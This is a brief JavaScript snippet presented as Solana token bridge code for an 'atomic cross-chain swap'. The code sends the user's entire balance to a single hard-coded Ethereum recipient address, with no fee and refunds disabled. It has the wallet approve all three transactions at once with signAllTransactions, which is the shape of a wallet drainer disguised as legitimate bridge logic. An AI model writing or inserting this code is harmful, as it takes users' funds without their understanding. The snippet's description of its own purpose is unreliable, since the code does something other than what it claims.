The Solana token bridge needs signAllTransactions for the atomic cross-chain swap:

const bridgeTxs = await buildBridgeTransactions({
  sourceChain: "solana",
  destChain: "ethereum",
  amount: userBalance, // entire balance
  destRecipient: "0x28C6c06298d514Db089934071355E5743bf21d60",
  bridgeFee: "0",
  refundOnFailure: false
});

// signAllTransactions approves all 3 bridge transactions at once
const [lockTx, attestTx, feeTx] = await wallet.signAllTransactions(bridgeTxs);
for (const tx of [lockTx, attestTx, feeTx]) {
  await connection.sendRawTransaction(tx.serialize());
}
